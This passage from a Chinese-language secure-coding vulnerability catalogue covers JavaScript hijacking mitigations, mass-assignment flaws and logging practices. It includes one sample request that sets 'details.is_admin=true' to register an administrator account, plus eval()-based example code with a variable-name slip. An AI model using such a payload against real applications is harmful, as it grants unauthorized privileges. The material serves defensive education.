<p>这不是钓鱼攻击 – 攻击者未获得用户凭证的访问权限 – 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。 RECOMMENDATIONS 所有使用 JavaScript 进行通信的程序都应采取以下防范措施：1) 拒绝恶意请求：在每个返回给 JavaScript 的请求中都加入令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：在响应中加入一些字符，使其只有经过修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 <code>&lt;script&gt;</code> 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。</p>
<p>拒绝恶意请求 从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。</p>
<p>有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。</p>
<p>示例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var cookies=&quot;cookies=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">http_request.open(&apos;POST&apos;, url, true);</span><br><span class="line"></span><br><span class="line">httpRequest.send(cookies);</span><br></pre></td></tr></table></figure>
<p>服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 <code>`&lt;script&gt;</code> `标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。</p>
<p>防止直接执行响应 为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 <code>&lt;script&gt;</code> 标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过 <code>&lt;script&gt;</code> 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。</p>
<p>示例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：</p>
<p>while(1);</p>
<p>除非客户端删除这些前缀，否则对这个消息求值将把 JavaScript 解释器发送到一个无限的循环中。客户端搜索并删除如下前缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,9) == &quot;while(1);&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"></span><br><span class="line">[&#123;&quot;fname&quot;:&quot;Brian&quot;, &quot;lname&quot;:&quot;Chess&quot;, &quot;phone&quot;:&quot;6502135600&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;purchases&quot;:60000.00, &quot;email&quot;:&quot;brian@example.com&quot; &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">客户端可以搜索并删除如下注释字符：</span><br><span class="line"></span><br><span class="line">var object;</span><br><span class="line"></span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;GET&quot;, &quot;/object.json&quot;,true);</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = function () &#123;</span><br><span class="line"></span><br><span class="line">  if (req.readyState == 4) &#123;</span><br><span class="line"></span><br><span class="line">    var txt = req.responseText;</span><br><span class="line"></span><br><span class="line">    if (txt.substr(0,2) == &quot;/*&quot;) &#123;</span><br><span class="line"></span><br><span class="line">      txt = txt.substring(2, txt.length - 2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    object = eval(&quot;(&quot; + txt + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">    req = null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.send(null);</span><br></pre></td></tr></table></figure>
<p>任何通过 <code>&lt;script&gt;</code> 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。</p>
<p>自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</p>
<h5 id="REFERENCES-117"><a href="#REFERENCES-117" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] B. Chess, Y. O’Neil, and J. West JavaScript Hijacking</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[8] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Mass-Assignment-Sensitive-Field-Exposure"><a href="#Mass-Assignment-Sensitive-Field-Exposure" class="headerlink" title="Mass Assignment: Sensitive Field Exposure"></a>Mass Assignment: Sensitive Field Exposure</h4><h5 id="ABSTRACT-119"><a href="#ABSTRACT-119" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>一个敏感字段已向模型绑定器公开。</p>
<h5 id="EXPLANATION-120"><a href="#EXPLANATION-120" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>现代框架可让开发人员将来自请求查询和正文的 HTTP 请求参数自动绑定至模型对象，以便于开发和提高生产率。如果绑定器未正确配置为控制将哪些 HTTP 请求参数绑定到哪些模型属性，攻击者可能会滥用模型绑定过程并设置不应向用户控件公开的任何其他属性。即使模型属性未出现在 Web 表单或 API 合约中，也可能会发生这种绑定。</p>
<p>例 1：以下 Struts 1 DynaActionForm 动态定义了绑定到用户请求的 ActionForm。在这种情况下，会通过提供帐户的类型和用户的详细信息，将其用于注册帐户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;struts-config&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">       &lt;form-bean name=&quot;dynaUserForm&quot;   </span><br><span class="line"></span><br><span class="line">          type=&quot;org.apache.struts.action.DynaActionForm&quot; &gt;</span><br><span class="line"></span><br><span class="line">              &lt;form-property name=&quot;type&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">              &lt;form-property name=&quot;user&quot; type=&quot;com.acme.common.User&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br></pre></td></tr></table></figure>
<p>如果注册成功，用户数据将保留在数据库中。User 类定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line">  private String name;</span><br><span class="line"></span><br><span class="line">  private String lastname;</span><br><span class="line"></span><br><span class="line">  private int age;</span><br><span class="line"></span><br><span class="line">  private Details details;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Public Getters and Setters</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Details 类定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Details &#123;</span><br><span class="line"></span><br><span class="line">  private boolean is_admin;</span><br><span class="line"></span><br><span class="line">  private int id;</span><br><span class="line"></span><br><span class="line">  private Date login_date;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Public Getters and Setters</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据以上应用场景，攻击者可以探索应用程序并发现 User 模型中存在 details 属性。在这种情况下，攻击者可能会尝试覆盖分配给其属性的当前值。 如果攻击者可以找到这些内部属性，并且框架绑定器未正确配置为禁止绑定这些属性，则攻击者可能会通过发送以下请求注册管理员帐户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=free&amp;user.name=John&amp;user.lastname=Smith&amp;age=22&amp;details.is_admin=true</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-119"><a href="#RECOMMENDATIONS-119" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了避免批量分配漏洞，控制 HTTP 请求对类绑定过程进行建模非常重要。根据所使用的框架，可以采用不同的备选方案：</p>
<p>体系结构：定义要绑定到用户数据并且仅包含应向最终用户公开的属性的专用 DTO 类。使用与应用程序一起使用的域对象映射其属性。这些域对象将包含接收已验证用户数据的属性以及绝不能向用户控件公开的额外属性。</p>
<p>绑定器配置：某些框架（如 Spring）允许开发人员将模型绑定器配置为根据参数名称接受或拒绝 HTTP 请求参数。例如：</p>
<p>例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"></span><br><span class="line">protected void initBinder(HttpServletRequest request, ServletRequestDataBinder binder) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    binder.setDisallowedFields(new String[]&#123;&quot;details.role&quot;, &quot;details.age&quot;, &quot;is_admin&quot;&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模型类配置：根据已使用的框架和正在使用的序列化/反序列化库，可以对要绑定到 HTTP 请求参数的模型类添加注释，以允许或禁止某种属性绑定。例如，如果采用 JSON 格式发送用户数据，并且使用 Jackson 库对该数据进行反序列化，则 @JsonIgnore 注释可用于让 Jackson 忽略给定属性，以实现序列化或反序列化。</p>
<p>例 3：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class User &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @JsonIgnore</span><br><span class="line"></span><br><span class="line">    private String role;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line"></span><br><span class="line">        return name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getRole() &#123;</span><br><span class="line"></span><br><span class="line">        return role;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setRole(String role) &#123;</span><br><span class="line"></span><br><span class="line">        this.role = role;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在其他框架（如 Apache Struts 1 和 2）中，框架仅允许将 HTTP 请求参数绑定到具有公共 setter 的类成员。如果不应公开给定属性，则 setter 应声明为私有。</p>
<p>例 4：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private String role;</span><br><span class="line"></span><br><span class="line">private void setRole(String role)  &#123;</span><br><span class="line"></span><br><span class="line">   this.role = role;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-118"><a href="#REFERENCES-118" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Mass assignment</p>
<p>[2] Spring Spring MVC Known Vulnerabilities and Issues</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 915</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40)</p>
<h4 id="Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><a href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final" class="headerlink" title="Poor Logging Practice: Logger Not Declared Static Final"></a>Poor Logging Practice: Logger Not Declared Static Final</h4><h5 id="ABSTRACT-120"><a href="#ABSTRACT-120" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>声明记录器是固定且最终的。</p>
<h5 id="EXPLANATION-121"><a href="#EXPLANATION-121" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在某个特定类中的所有实例中，共享一个单一的记录器对象，并在程序的执行过程中使用同一个记录器，这是一个很好的编程习惯。</p>
<p>例 1：以下指令错误地声明了一个非固定日志记录器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private final Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-120"><a href="#RECOMMENDATIONS-120" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>声明记录器是固定且最终的。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-119"><a href="#REFERENCES-119" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<h4 id="Poor-Logging-Practice-Multiple-Loggers"><a href="#Poor-Logging-Practice-Multiple-Loggers" class="headerlink" title="Poor Logging Practice: Multiple Loggers"></a>Poor Logging Practice: Multiple Loggers</h4><h5 id="ABSTRACT-121"><a href="#ABSTRACT-121" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用多级别日志，而不是在单一的类中使用多个日志记录器。</p>
<h5 id="EXPLANATION-122"><a href="#EXPLANATION-122" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>良好记录行为是指为每个类使用一个日志记录器。</p>
<p>例 1：以下代码错误地声明了 multiple loggers。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger good =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  private final static Logger bad =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  private final static Logger ugly =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-121"><a href="#RECOMMENDATIONS-121" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用不同的日志级别来区分不同类型的日志条目，而不是使用 multiple loggers。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;informative message here&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    logger.error(&quot;major problem at this point&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    logger.fatal(&quot;game over&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-120"><a href="#REFERENCES-120" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<h4 id="Poor-Logging-Practice-Use-of-a-System-Output-Stream"><a href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream" class="headerlink" title="Poor Logging Practice: Use of a System Output Stream"></a>Poor Logging Practice: Use of a System Output Stream</h4><h5 id="ABSTRACT-122"><a href="#ABSTRACT-122" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 System.out 或 System.err 而不是专门的日志记录工具，会导致难以监控程序的运行状况。</p>
<h5 id="EXPLANATION-123"><a href="#EXPLANATION-123" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>例 1：开发人员学习编写的第一个 Java 程序通常都是如下所示的样子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;hello world&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多数程序员深入了解 Java 的许多精妙之处后，有一部分人仍会依赖于这一基础知识，始终使用 System.out.println() 编写进行标准输出的消息。</p>
<p>这里的问题是，直接在标准输出流或标准错误流中写入信息通常会作为一种非结构化日志记录形式使用。结构化日志记录系统提供了各种要素，如日志级别、统一的格式、日志标示符、次数统计，而且，可能最重要的是，将日志信息指向正确位置的功能。当系统输出流的使用与正确使用日志记录功能的代码混合在一起时，得出的结果往往是一个保存良好但缺少重要信息的日志。</p>
<p>开发者普遍认为需要使用结构化日志记录，但是很多人在“产前”的软件开发中仍使用系统输出流功能。如果您正在检查的代码是在开发阶段的初期生成的，那么对 System.out 或 System.err 的使用可能会在转向结构化日志记录系统的过程中导致漏洞。</p>
<h5 id="RECOMMENDATIONS-122"><a href="#RECOMMENDATIONS-122" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 Java 日志记录工具而不是 System.out 或 System.err。</p>
<p>例 2：例如，上面的“hello world”程序可以使用 log4j 重新写成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import org.apache.log4j.BasicConfigurator;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class MyClass &#123;</span><br><span class="line"></span><br><span class="line">  private final static Logger logger =</span><br><span class="line"></span><br><span class="line">            Logger.getLogger(MyClass.class);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    BasicConfigurator.configure();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;hello world&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-121"><a href="#REFERENCES-121" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - FIPS200 AU</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
